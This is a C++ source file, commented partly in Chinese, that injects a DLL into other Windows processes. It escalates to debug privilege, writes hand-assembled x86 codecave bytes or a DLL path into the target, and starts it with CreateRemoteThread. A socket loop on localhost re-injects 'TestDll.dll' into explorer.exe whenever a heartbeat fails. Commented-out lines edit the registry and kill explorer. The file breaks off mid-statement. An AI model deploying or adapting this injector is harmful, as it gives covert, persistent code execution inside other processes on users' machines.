﻿// ProcessInjection.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include "pch.h"
#include <Winsock2.h>//这个要放在<windows.h>前面才能结构体不报错
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <time.h>
#include <stdio.h>
#include <direct.h>
#include <string>
#include <atltime.h>
#include <WS2tcpip.h>

//#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口

/***************************************************************************************************/
//	Function: 
//		Inject
//	
//	Parameters:
//		HANDLE hProcess - The handle to the process to inject the DLL into.
//
//		const char* dllname - The name of the DLL to inject into the process.
//		
//		const char* funcname - The name of the function to call once the DLL has been injected.
//
//	Description:
//		This function will inject a DLL into a process and execute an exported function
//		from the DLL to "initialize" it. The function should be in the format shown below,
//		not parameters and no return type. Do not forget to prefix extern "C" if you are in C++
//
//			__declspec(dllexport) void FunctionName(void)
//
//		The function that is called in the injected DLL
//		-MUST- return, the loader waits for the thread to terminate before removing the 
//		allocated space and returning control to the Loader. This method of DLL injection
//		also adds error handling, so the end user knows if something went wrong.
/***************************************************************************************************/

void Inject(HANDLE hProcess, const char* dllname, const char* funcname)
{
	//------------------------------------------//
	// Function variables.						//
	//------------------------------------------//

		// Main DLL we will need to load
	HMODULE kernel32 = NULL;

	// Main functions we will need to import
	FARPROC loadlibrary = NULL;
	FARPROC getprocaddress = NULL;
	FARPROC exitprocess = NULL;
	FARPROC exitthread = NULL;
	FARPROC freelibraryandexitthread = NULL;

	// The workspace we will build the codecave on locally
	LPBYTE workspace = NULL;
	DWORD workspaceIndex = 0;

	// The memory in the process we write to
	LPVOID codecaveAddress = NULL;
	DWORD dwCodecaveAddress = 0;

	// std::strings we have to write into the process
	char injectDllName[MAX_PATH + 1] = { 0 };
	char injectFuncName[MAX_PATH + 1] = { 0 };
	char injectError0[MAX_PATH + 1] = { 0 };
	char injectError1[MAX_PATH + 1] = { 0 };
	char injectError2[MAX_PATH + 1] = { 0 };
	char user32Name[MAX_PATH + 1] = { 0 };
	char msgboxName[MAX_PATH + 1] = { 0 };

	// Placeholder addresses to use the std::strings
	DWORD user32NameAddr = 0;
	DWORD user32Addr = 0;
	DWORD msgboxNameAddr = 0;
	DWORD msgboxAddr = 0;
	DWORD dllAddr = 0;
	DWORD dllNameAddr = 0;
	DWORD funcNameAddr = 0;
	DWORD error0Addr = 0;
	DWORD error1Addr = 0;
	DWORD error2Addr = 0;

	// Where the codecave execution should begin at
	DWORD codecaveExecAddr = 0;

	// Handle to the thread we create in the process
	HANDLE hThread = NULL;

	// Temp variables
	DWORD dwTmpSize = 0;

	// Old protection on page we are writing to in the process and the bytes written
	DWORD oldProtect = 0;
	SIZE_T bytesRet = 0;

	//------------------------------------------//
	// Variable initialization.					//
	//------------------------------------------//

		// Get the address of the main DLL
	kernel32 = LoadLibrary("kernel32.dll");

	// Get our functions
	loadlibrary = GetProcAddress(kernel32, "LoadLibraryA");
	getprocaddress = GetProcAddress(kernel32, "GetProcAddress");
	exitprocess = GetProcAddress(kernel32, "ExitProcess");
	exitthread = GetProcAddress(kernel32, "ExitThread");
	freelibraryandexitthread = GetProcAddress(kernel32, "FreeLibraryAndExitThread");

	// This section will cause compiler warnings on VS8, 
	// you can upgrade the functions or ignore them

		// Build names
	_snprintf(injectDllName, MAX_PATH, "%s", dllname);
	_snprintf(injectFuncName, MAX_PATH, "%s", funcname);
	_snprintf(user32Name, MAX_PATH, "user32.dll");
	_snprintf(msgboxName, MAX_PATH, "MessageBoxA");

	// Build error messages
	_snprintf(injectError0, MAX_PATH, "Error");
	_snprintf(injectError1, MAX_PATH, "Could not load the dll: %s", injectDllName);
	_snprintf(injectError2, MAX_PATH, "Could not load the function: %s", injectFuncName);

	// Create the workspace
	workspace = (LPBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024);

	// Allocate space for the codecave in the process
	codecaveAddress = VirtualAllocEx(hProcess, 0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	dwCodecaveAddress = PtrToUlong(codecaveAddress);

	// Note there is no error checking done above for any functions that return a pointer/handle.
	// I could have added them, but it'd just add more messiness to the code and not provide any real
	// benefit. It's up to you though in your final code if you want it there or not.

	//------------------------------------------//
	// Data and std::string writing.					//
	//------------------------------------------//

		// Write out the address for the user32 dll address
	user32Addr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = 0;
	memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
	workspaceIndex += 4;

	// Write out the address for the MessageBoxA address
	msgboxAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = 0;
	memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
	workspaceIndex += 4;

	// Write out the address for the injected DLL's module
	dllAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = 0;
	memcpy(workspace + workspaceIndex, &dwTmpSize, 4);
	workspaceIndex += 4;

	// User32 Dll Name
	user32NameAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(user32Name) + 1;
	memcpy(workspace + workspaceIndex, user32Name, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// MessageBoxA name
	msgboxNameAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(msgboxName) + 1;
	memcpy(workspace + workspaceIndex, msgboxName, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Dll Name
	dllNameAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(injectDllName) + 1;
	memcpy(workspace + workspaceIndex, injectDllName, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Function Name
	funcNameAddr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(injectFuncName) + 1;
	memcpy(workspace + workspaceIndex, injectFuncName, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Error Message 1
	error0Addr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(injectError0) + 1;
	memcpy(workspace + workspaceIndex, injectError0, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Error Message 2
	error1Addr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(injectError1) + 1;
	memcpy(workspace + workspaceIndex, injectError1, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Error Message 3
	error2Addr = workspaceIndex + dwCodecaveAddress;
	dwTmpSize = (DWORD)strlen(injectError2) + 1;
	memcpy(workspace + workspaceIndex, injectError2, dwTmpSize);
	workspaceIndex += dwTmpSize;

	// Pad a few INT3s after std::string data is written for seperation
	workspace[workspaceIndex++] = 0xCC;
	workspace[workspaceIndex++] = 0xCC;
	workspace[workspaceIndex++] = 0xCC;

	// Store where the codecave execution should begin
	codecaveExecAddr = workspaceIndex + dwCodecaveAddress;

	// For debugging - infinite loop, attach onto process and step over
		//workspace[workspaceIndex++] = 0xEB;
		//workspace[workspaceIndex++] = 0xFE;

	//------------------------------------------//
	// User32.dll loading.						//
	//------------------------------------------//

	// User32 DLL Loading
		// PUSH 0x00000000 - Push the address of the DLL name to use in LoadLibraryA
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &user32NameAddr, 4);
	workspaceIndex += 4;

	// MOV EAX, ADDRESS - Move the address of LoadLibraryA into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &loadlibrary, 4);
	workspaceIndex += 4;

	// CALL EAX - Call LoadLibraryA
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// MessageBoxA Loading
		// PUSH 0x000000 - Push the address of the function name to load
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &msgboxNameAddr, 4);
	workspaceIndex += 4;

	// Push EAX, module to use in GetProcAddress
	workspace[workspaceIndex++] = 0x50;

	// MOV EAX, ADDRESS - Move the address of GetProcAddress into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &getprocaddress, 4);
	workspaceIndex += 4;

	// CALL EAX - Call GetProcAddress
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// MOV [ADDRESS], EAX - Save the address to our variable
	workspace[workspaceIndex++] = 0xA3;
	memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
	workspaceIndex += 4;

	//------------------------------------------//
	// Injected dll loading.					//
	//------------------------------------------//

	/*
		// This is the way the following assembly code would look like in C/C++

		// Load the injected DLL into this process
		HMODULE h = LoadLibrary("mydll.dll");
		if(!h)
		{
			MessageBox(0, "Could not load the dll: mydll.dll", "Error", MB_ICONERROR);
			ExitProcess(0);
		}

		// Get the address of the export function
		FARPROC p = GetProcAddress(h, "Initialize");
		if(!p)
		{
			MessageBox(0, "Could not load the function: Initialize", "Error", MB_ICONERROR);
			ExitProcess(0);
		}

		// So we do not need a function pointer interface
		__asm call p

		// Exit the thread so the loader continues
		ExitThread(0);
	*/

	// DLL Loading
		// PUSH 0x00000000 - Push the address of the DLL name to use in LoadLibraryA
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &dllNameAddr, 4);
	workspaceIndex += 4;

	// MOV EAX, ADDRESS - Move the address of LoadLibraryA into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &loadlibrary, 4);
	workspaceIndex += 4;

	// CALL EAX - Call LoadLibraryA
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// Error Checking
		// CMP EAX, 0
	workspace[workspaceIndex++] = 0x83;
	workspace[workspaceIndex++] = 0xF8;
	workspace[workspaceIndex++] = 0x00;

	// JNZ EIP + 0x1E to skip over eror code
	workspace[workspaceIndex++] = 0x75;
	workspace[workspaceIndex++] = 0x1E;

	// Error Code 1
		// MessageBox
			// PUSH 0x10 (MB_ICONHAND)
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x10;

	// PUSH 0x000000 - Push the address of the MessageBox title
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &error0Addr, 4);
	workspaceIndex += 4;

	// PUSH 0x000000 - Push the address of the MessageBox message
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &error1Addr, 4);
	workspaceIndex += 4;

	// Push 0
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// MOV EAX, [ADDRESS] - Move the address of MessageBoxA into EAX
	workspace[workspaceIndex++] = 0xA1;
	memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
	workspaceIndex += 4;

	// CALL EAX - Call MessageBoxA
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// ExitProcess
		// Push 0
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// MOV EAX, ADDRESS - Move the address of ExitProcess into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &exitprocess, 4);
	workspaceIndex += 4;

	// CALL EAX - Call MessageBoxA
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	//	Now we have the address of the injected DLL, so save the handle

		// MOV [ADDRESS], EAX - Save the address to our variable
	workspace[workspaceIndex++] = 0xA3;
	memcpy(workspace + workspaceIndex, &dllAddr, 4);
	workspaceIndex += 4;

	// Load the initilize function from it

		// PUSH 0x000000 - Push the address of the function name to load
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &funcNameAddr, 4);
	workspaceIndex += 4;

	// Push EAX, module to use in GetProcAddress
	workspace[workspaceIndex++] = 0x50;

	// MOV EAX, ADDRESS - Move the address of GetProcAddress into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &getprocaddress, 4);
	workspaceIndex += 4;

	// CALL EAX - Call GetProcAddress
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// Error Checking
		// CMP EAX, 0
	workspace[workspaceIndex++] = 0x83;
	workspace[workspaceIndex++] = 0xF8;
	workspace[workspaceIndex++] = 0x00;

	// JNZ EIP + 0x1C to skip eror code
	workspace[workspaceIndex++] = 0x75;
	workspace[workspaceIndex++] = 0x1C;

	// Error Code 2
		// MessageBox
			// PUSH 0x10 (MB_ICONHAND)
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x10;

	// PUSH 0x000000 - Push the address of the MessageBox title
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &error0Addr, 4);
	workspaceIndex += 4;

	// PUSH 0x000000 - Push the address of the MessageBox message
	workspace[workspaceIndex++] = 0x68;
	memcpy(workspace + workspaceIndex, &error2Addr, 4);
	workspaceIndex += 4;

	// Push 0
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// MOV EAX, ADDRESS - Move the address of MessageBoxA into EAX
	workspace[workspaceIndex++] = 0xA1;
	memcpy(workspace + workspaceIndex, &msgboxAddr, 4);
	workspaceIndex += 4;

	// CALL EAX - Call MessageBoxA
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// ExitProcess
		// Push 0
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// MOV EAX, ADDRESS - Move the address of ExitProcess into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &exitprocess, 4);
	workspaceIndex += 4;

	//	Now that we have the address of the function, we cam call it, 
	// if there was an error, the messagebox would be called as well.

		// CALL EAX - Call ExitProcess -or- the Initialize function
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;

	// If we get here, the Initialize function has been called, 
	// so it's time to close this thread and optionally unload the DLL.

//------------------------------------------//
// Exiting from the injected dll.			//
//------------------------------------------//

// Call ExitThread to leave the DLL loaded
#if 1
	// Push 0 (exit code)
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// MOV EAX, ADDRESS - Move the address of ExitThread into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &exitthread, 4);
	workspaceIndex += 4;

	// CALL EAX - Call ExitThread
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;
#endif

	// Call FreeLibraryAndExitThread to unload DLL
#if 0
	// Push 0 (exit code)
	workspace[workspaceIndex++] = 0x6A;
	workspace[workspaceIndex++] = 0x00;

	// PUSH [0x000000] - Push the address of the DLL module to unload
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0x35;
	memcpy(workspace + workspaceIndex, &dllAddr, 4);
	workspaceIndex += 4;

	// MOV EAX, ADDRESS - Move the address of FreeLibraryAndExitThread into EAX
	workspace[workspaceIndex++] = 0xB8;
	memcpy(workspace + workspaceIndex, &freelibraryandexitthread, 4);
	workspaceIndex += 4;

	// CALL EAX - Call FreeLibraryAndExitThread
	workspace[workspaceIndex++] = 0xFF;
	workspace[workspaceIndex++] = 0xD0;
#endif

	//------------------------------------------//
	// Code injection and cleanup.				//
	//------------------------------------------//

		// Change page protection so we can write executable code
	VirtualProtectEx(hProcess, codecaveAddress, workspaceIndex, PAGE_EXECUTE_READWRITE, &oldProtect);

	// Write out the patch
	WriteProcessMemory(hProcess, codecaveAddress, workspace, workspaceIndex, &bytesRet);

	// Restore page protection
	VirtualProtectEx(hProcess, codecaveAddress, workspaceIndex, oldProtect, &oldProtect);

	// Make sure our changes are written right away
	FlushInstructionCache(hProcess, codecaveAddress, workspaceIndex);

	// Free the workspace memory
	HeapFree(GetProcessHeap(), 0, workspace);

	// Execute the thread now and wait for it to exit, note we execute where the code starts, and not the codecave start
	// (since we wrote std::strings at the start of the codecave) -- NOTE: void* used for VC6 compatibility instead of UlongToPtr
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((void*)codecaveExecAddr), 0, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	// Free the memory in the process that we allocated
	VirtualFreeEx(hProcess, codecaveAddress, 0, MEM_RELEASE);
}

// 提升进程访问权限
bool enableDebugPriv()
{
	HANDLE hToken;
	LUID   sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)
	)
	{
		return false;
	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;
	}
	return true;
}
// 根据进程名称得到进程ID,如果有多个运行实例的话，返回第一个枚举到的进程的ID
DWORD processNameToId(LPCTSTR lpszProcessName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hSnapshot, &pe))
	{
		MessageBox(NULL,"The frist entry of the process list has not been copyied to the buffer","Notice",MB_ICONINFORMATION | MB_OK);
		return 0;
	}
	while (Process32Next(hSnapshot, &pe))
	{
		if (!strcmp(lpszProcessName, pe.szExeFile))
		{
			return pe.th32ProcessID;
		}
	}
	return 0;
}

HMODULE GetSelfModuleHandle()
{
	MEMORY_BASIC_INFORMATION mbi;
	return ((::VirtualQuery(GetSelfModuleHandle, &mbi, sizeof(mbi)) != 0) ? (HMODULE)mbi.AllocationBase : NULL);
}
std::string GetCurrentDic(std::string mypath)
{
	char test[] = { "\\" };
	int index=mypath.rfind(test,mypath.length());
	mypath = mypath.substr(0, index);
	return mypath;
}
int CharStrToInt(char* str)
{
	if (str == NULL || str[0] == '\0')
		return 0;
	int number = 0;
	int length = strlen(str);
	for (int i = 0; i <length; i++)
	{
		number *= 10;
		number += str[i] - '0';
	}
	return number;
}
SOCKET GetSOCKET(PCSTR addr,u_short port)
{
	std::cout << "ClientThreadMethod" << std::endl;
	//第一步：加载socket库函数
	//**********************************************************
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	wVersionRequested = MAKEWORD(1, 1);
	err = WSAStartup(wVersionRequested, &wsaData);
	if (err != 0)
	{
		return 0;
	}
	if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	{
		WSACleanup();
		return 0;
	}
	//**********************************************************
	//第一步，创建套接字
	SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
	//定义套接字地址
	SOCKADDR_IN addrSrv;
	inet_pton(AF_INET, addr, (void*)&addrSrv.sin_addr.S_un.S_addr);
	//addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  //获取服务器IP地址,inet_addr()将IP地址转为点分十进制的格式
	addrSrv.sin_family = AF_INET;
	//sin_family 表示地址族，对于IP地址，sin_family成员将一直是AF_INET
	addrSrv.sin_port = htons(port);
	//连接服务器
	//      connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	if (connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)) != 0)
	{
		//MessageBox("连接失败");
		//return;
		printf("error\n");
		return 0;
	}
	else
	{
		printf("success\n");
	}
	return sockClient;
}
int InjectProcess(std::string dllName, std::string szExeName)
{
	/*int a1 = system("@echo off");
	int a2 = system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop\" /V FFLAGS /T REG_DWORD /D 1075839520 /F");
	int a3 = system("taskkill /f /im explorer.exe");
	int a4 = system("start explorer.exe");*/

	const int bufferSize = 1024;//用于存储一般缓存区的大小。
	//std::string dllName = "TestDll.dll";
	char buffer[bufferSize] = { 0 };
	//char szExeName[] = { "notepad.exe" };
	char szDll[bufferSize];
	//char szDll[] = { "C:\\Users\\13643\\Desktop\\ProcessInjection\\x64\\Debug\\TestDll.dll" };//切记dll路径一定要写全。
	//GetCurrentDic(szDll);
	DWORD dwWriteBytes = 0;
	GetModuleFileName(GetSelfModuleHandle(), buffer, bufferSize);
	std::string szDllTemp = GetCurrentDic(buffer) + "\\" + dllName;

	int i = 0;
	for (i = 0; i < szDllTemp.length(); i++)
	{
		szDll[i] = szDllTemp[i];
	}
	szDll[i] = '\0';
	// 提升进程访问权限
	if (enableDebugPriv() == false)
	{
		std::cout << "提权失败！" << std::endl;
	}
	// 输入进程名称，注意大小写匹配
	std::cout << "Injecting process !" << std::endl;

	//std::cin >> szExeName;
	DWORD dwProcessId = processNameToId(szExeName.data());
	if (dwProcessId == 0)
	{
		std::cout << "GetLastError:" << GetLastError() <<"\tprocessNameToId"<< std::endl;
		/*MessageBox(NULL,
			"The target process have not been found !",
			"Notice",
			MB_ICONINFORMATION | MB_OK
		);*/
		return -1;
	}

	//根据进程ID得到进程句柄
	HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwProcessId);

	if (!hTargetProcess)
	{
		std::cout << "GetLastError:" << GetLastError()<<"\tOpenProcess" << std::endl;
		/*MessageBox(NULL,
			"Open target process failed !",
			"Notice",
			MB_ICONINFORMATION | MB_OK
		);*/
		return -2;
	}

	// 在宿主进程中为线程体开辟一块存储区域
	// 在这里需要注意MEM_COMMIT内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型
	// 其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。
	void* pRemoteThread = VirtualAllocEx(hTargetProcess,
		0,
		sizeof(szDll),
		MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pRemoteThread)
	{
		std::cout << "GetLastError:" << GetLastError()<<"\tVirtualAllocEx" << std::endl;
		/*MessageBox(NULL,
			"Alloc memory in target process failed !",
			"notice",
			MB_ICONINFORMATION | MB_OK
		);*/
		return 0;
	}
	// 设置需要注入的DLL名称

	//memset(szDll, 0, 256);
	//strcpy(szDll, "C:\\Users\\13643\\source\\repos\\ProcessInjection\\Debug\\TestDll.dll");
	// 拷贝注入DLL内容到宿主空间
	if (!WriteProcessMemory(hTargetProcess,
		pRemoteThread,
		(LPVOID)szDll,
		sizeof(szDll),
		0))
	{
		std::cout << "GetLastError:" << GetLastError()<<"\tWriteProcessMemory" << std::endl;
		/*MessageBox(NULL,
			"Write data to target process failed !",
			"Notice",
			MB_ICONINFORMATION | MB_OK
		);*/
		return 0;
	}

	LPVOID pFunc = LoadLibraryA;
	//在宿主进程中创建线程
	HANDLE hRemoteThread = CreateRemoteThread(hTargetProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)pFunc,
		pRemoteThread,
		0,
		&dwWriteBytes);

	if (!hRemoteThread)
	{
		std::cout << "GetLastError:" << GetLastError()<<"\tCreateRemoteThread" << std::endl;
		/*MessageBox(NULL,
			"Create remote thread failed !",
			"Notice",
			MB_ICONINFORMATION | MB_OK
		);*/
		return 0;
	}
	return 1;
}
DWORD ClientThreadMethod(LPVOID pParam)
{
	int mod = 100000;
	int indexNumber = 1;
	int readyState = 1;

	std::cout << "ClientThreadMethod" << std::endl;

	SOCKET sockClient = GetSOCKET("127.0.0.1", 6000);

	//第一步：加载socket库函数
	//**********************************************************
	//WORD wVersionRequested;
	//WSADATA wsaData;
	//int err;
	//wVersionRequested = MAKEWORD(1, 1);
	//err = WSAStartup(wVersionRequested, &wsaData);
	//if (err != 0)
	//{
	//	return 0;
	//}
	//if (LOBYTE(wsaData.wVersion) != 1 || HIBYTE(wsaData.wVersion) != 1)
	//{
	//	WSACleanup();
	//	return 0;
	//}
	////**********************************************************
	////第一步，创建套接字
	//SOCKET sockClient = socket(AF_INET, SOCK_STREAM, 0);
	////定义套接字地址
	//SOCKADDR_IN addrSrv;
	//inet_pton(AF_INET, "127.0.0.1", (void*)&addrSrv.sin_addr.S_un.S_addr);
	////addrSrv.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");  //获取服务器IP地址,inet_addr()将IP地址转为点分十进制的格式
	//addrSrv.sin_family = AF_INET;
	////sin_family 表示地址族，对于IP地址，sin_family成员将一直是AF_INET
	//addrSrv.sin_port = htons(6000);
	////连接服务器
	////      connect(sockClient,(SOCKADDR*)&addrSrv,sizeof(SOCKADDR));
	//if (connect(sockClient, (SOCKADDR*)&addrSrv, sizeof(SOCKADDR)) != 0)
	//{
	//	//MessageBox("连接失败");
	//	//return;
	//	printf("error\n");
	//	return 0;
	//}
	//else
	//{
	//	printf("success\n");
	//}


	while (1)
	{
		char recvBuf[100] = { '\0' };
		//printf("等待接受数据\n");
		int cnt = (int)recv(sockClient, recvBuf, 100, 0);//cnt==0那表明连接已经断开
		std::cout << "Client:recv->recvBuf->" << recvBuf << std::endl;
		int recvNumber = CharStrToInt(recvBuf);
		if (recvNumber != readyState)
		{
			std::cout << "Client:信息同步错误！->ClientThreadMethod" << std::endl;
			Sleep(1000);
			int result = InjectProcess("TestDll.dll", "explorer.exe");
			sockClient = GetSOCKET("127.0.0.1", 6000);
			indexNumber = 1;
			readyState = 1;
			continue;
		}
			
		char sendMessage[] = { "this is client send message !" };
		send(sockClient, std::to_string(readyState).data(), 2, 0);
		while (1)
		{
			indexNumber %= mod;
			char recvBuf[100] = { '\0' };
			//printf("等待接受数据\n");
			int cnt = (int)recv(sockClient, recvBuf, 100, 0);//cnt==0那表明连接已经断开
			std::cout << "Client:recvBuf-> "<< recvBuf<<"\tindexNumber:"<< indexNumber << std::endl;
			
		
			/*if (recvBuf[0]!='\0')
			{
				MessageBox(NULL, stringToLPCWSTR(recvBuf), L"recvBuf:", MB_ICONINFORMATION);
			}*/

			if (cnt > 0)
			{
				//正常处理数据
				CString  m_str(recvBuf);
				//printf("%s\n", recvBuf);
				int recvNumber = CharStrToInt(recvBuf);
				if (recvNumber != (indexNumber + 1)%mod)
				{
					std::cout << "Client:recvNumber != indexNumber + 1" << std::endl;
					std::cout << "Client:recvNumber->" << recvNumber << "\tindexNumber:" << indexNumber << std::endl;
					return 0;
				}
				std::string sendMessage = std::to_string((recvNumber + 1)%mod);
				send(sockClient, sendMessage.data(), sendMessage.length() + 1, 0);
			}
			else
			{
				if ((cnt < 0) && (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR)) //这几种错误码，认为连接是正常的，继续接收
				{
					continue;//继续接收数据
				}
				break;//跳出接收循环
			}
			Sleep(100);
			indexNumber+=2;
		}
		Sleep(1000);
	}
	
	while (1)
	{
		Sleep(1000);
	}

	//关闭套接字
	closesocket(sockClient);
	//清除套接字资源
	WSACleanup();
	return 0;
}
int main(int argc, char* argv[])
{
	/*int a1 = system("@echo off");
	int a2 = system("REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\Shell\\Bags\\1\\Desktop\" /V FFLAGS /T REG_DWORD /D 1075839520 /F");
	int a3 = system("taskkill /f /im explorer.exe");
	int a4 = system("start explorer.exe");*/
	
	//const int bufferSize = 1024;//用于存储一般缓存区的大小。
	//std::string dllName = "TestDll.dll";
	//char buffer[bufferSize] = {0};
	//char szExeName[] = { "notepad.exe" };
	//char szDll[bufferSize];
	////char szDll[] = { "C:\\Users\\13643\\Desktop\\ProcessInjection\\x64\\Debug\\TestDll.dll" };//切记dll路径一定要写全。
	////GetCurrentDic(szDll);
	//DWORD dwWriteBytes=0;
	//GetModuleFileName(GetSelfModuleHandle(), buffer, bufferSize);
	//std::string szDllTemp = GetCurrentDic(buffer)+"\\"+ dllName;
	//
	//int i = 0;
	//for (i = 0; i < szDllTemp.length(); i++)
	//{
	//	szDll[i] = szDllTemp[i];
	//}
	//szDll[i] = '\0';
	//// 提升进程访问权限
	//if (enableDebugPriv() == false)
	//{
	//	std::cout << "提权失败！" << std::endl;
	//}
	//// 输入进程名称，注意大小写匹配
	//std::cout << "Injecting process !" << std::endl;
	//
	////std::cin >> szExeName;
	//DWORD dwProcessId = processNameToId(szExeName);
	//if (dwProcessId == 0)
	//{
	//	std::cout << "GetLastError:" << GetLastError() << std::endl;
	//	MessageBox(NULL,
	//		"The target process have not been found !",
	//		"Notice",
	//		MB_ICONINFORMATION | MB_OK
	//	);
	//	return -1;
	//}

	////根据进程ID得到进程句柄
	//HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwProcessId);

	//if (!hTargetProcess)
	//{
	//	std::cout << "GetLastError:" << GetLastError() << std::endl;
	//	MessageBox(NULL,
	//		"Open target process failed !",
	//		"Notice",
	//		MB_ICONINFORMATION | MB_OK
	//	);
	//	return -2;
	//}

	//// 在宿主进程中为线程体开辟一块存储区域
	//// 在这里需要注意MEM_COMMIT内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型
	//// 其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。
	//void* pRemoteThread = VirtualAllocEx(hTargetProcess,
	//	0,
	//	sizeof(szDll),
	//	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	//if (!pRemoteThread)
	//{
	//	std::cout << "GetLastError:" << GetLastError() << std::endl;
	//	MessageBox(NULL,
	//		"Alloc memory in target process failed !",
	//		"notice",
	//		MB_ICONINFORMATION | MB_OK
	//	);
	//	return 0;
	//}
	//// 设置需要注入的DLL名称
	//
	////memset(szDll, 0, 256);
	////strcpy(szDll, "C:\\Users\\13643\\source\\repos\\ProcessInjection\\Debug\\TestDll.dll");
	//// 拷贝注入DLL内容到宿主空间
	//if (!WriteProcessMemory(hTargetProcess,
	//	pRemoteThread,
	//	(LPVOID)szDll,
